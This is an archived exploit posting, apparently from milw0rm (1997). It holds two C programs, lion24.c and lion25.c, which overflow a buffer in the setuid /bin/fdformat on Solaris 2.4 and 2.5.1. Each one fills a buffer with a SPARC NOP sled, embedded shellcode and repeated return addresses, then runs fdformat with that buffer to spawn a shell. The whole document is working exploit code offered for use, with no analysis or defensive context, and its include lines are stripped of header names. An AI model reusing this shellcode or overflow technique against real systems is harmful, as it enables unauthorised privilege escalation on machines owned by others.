--------------------------- lion24.c ---------------------------------
/*
Solaris 2.4
*/

  #include 
   #include 
   #include 
   #include 
   
   #define BUF_LENGTH 264
   #define EXTRA 36
   #define STACK_OFFSET -56
   #define SPARC_NOP 0xa61cc013
   
   u_char sparc_shellcode[] =

   "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xda\xdc\xae\x15\xe3\x68"
   "\x90\x0b\x80\x0e\x92\x03\xa0\x0c\x94\x1a\x80\x0a\x9c\x03\xa0\x14"
   "\xec\x3b\xbf\xec\xc0\x23\xbf\xf4\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc"
   "\x82\x10\x20\x3b\x91\xd0\x20\x08\x90\x1b\xc0\x0f\x82\x10\x20\x01"
   "\x91\xd0\x20\x08"
   ;
   
   u_long get_sp(void)
   {
   __asm__("mov %sp,%i0 \n");
   }
   
   void main(int argc, char *argv[])
   {
   char buf[BUF_LENGTH + EXTRA + 8];
   long targ_addr;
   u_long *long_p;
   u_char *char_p;
   int i, code_length = strlen(sparc_shellcode),dso=0;
   
   if(argc > 1) dso=atoi(argv[1]);
   
   long_p =(u_long *) buf ;
   targ_addr = get_sp() - STACK_OFFSET - dso;
   
   for (i = 0; i < (BUF_LENGTH - code_length) / sizeof(u_long); i++)
   *long_p++ = SPARC_NOP;
   
   char_p = (u_char *) long_p;
   
   for (i = 0; i < code_length; i++)
   *char_p++ = sparc_shellcode[i];
   
   long_p = (u_long *) char_p;
   
   for (i = 0; i < EXTRA / sizeof(u_long); i++)
   *long_p++ =targ_addr;
   
   printf("Jumping to address 0x%lx B[%d] E[%d] SO[%d]\n",
   targ_addr,BUF_LENGTH,EXTRA,STACK_OFFSET);
   execl("/bin/fdformat", "fdformat   ", &buf[0],(char *) 0);
   perror("execl failed");
   }
------------------------------ end of lion24.c --------------------------

-------------------------------- lion25.c ------------------------------
/* 
Solaris 2.5.1 - this exploited was compiled on Solaris2.4 and tested on
2.5.1
*/

   #include 
   #include 
   #include 
   #include 
   
   #define BUF_LENGTH 364
   #define EXTRA 400
   #define STACK_OFFSET 704
   #define SPARC_NOP 0xa61cc013
   
   u_char sparc_shellcode[] =

   "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xda\xdc\xae\x15\xe3\x68"
   "\x90\x0b\x80\x0e\x92\x03\xa0\x0c\x94\x1a\x80\x0a\x9c\x03\xa0\x14"
   "\xec\x3b\xbf\xec\xc0\x23\xbf\xf4\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc"
   "\x82\x10\x20\x3b\x91\xd0\x20\x08\x90\x1b\xc0\x0f\x82\x10\x20\x01"
   "\x91\xd0\x20\x08"
   ;
   
   u_long get_sp(void)
   {
   __asm__("mov %sp,%i0 \n");
   }
   void main(int argc, char *argv[])
   {
   char buf[BUF_LENGTH + EXTRA + 8];
   long targ_addr;
   u_long *long_p;
   u_char *char_p;
   int i, code_length = strlen(sparc_shellcode),dso=0;
   
   if(argc > 1) dso=atoi(argv[1]);
   
   long_p =(u_long *) buf ;
   targ_addr = get_sp() - STACK_OFFSET - dso;
   for (i = 0; i < (BUF_LENGTH - code_length) / sizeof(u_long); i++)
   *long_p++ = SPARC_NOP;
   
   char_p = (u_char *) long_p;
   
   for (i = 0; i < code_length; i++)
   *char_p++ = sparc_shellcode[i];
   
   long_p = (u_long *) char_p;
   
   for (i = 0; i < EXTRA / sizeof(u_long); i++)
   *long_p++ =targ_addr;
   
   printf("Jumping to address 0x%lx B[%d] E[%d] SO[%d]\n",
   targ_addr,BUF_LENGTH,EXTRA,STACK_OFFSET);
   execl("/bin/fdformat", "fdformat", & buf[1],(char *) 0);
   perror("execl failed");
   }

--------------------------- end of lion25.c -------------------------------


// milw0rm.com [1997-03-23]
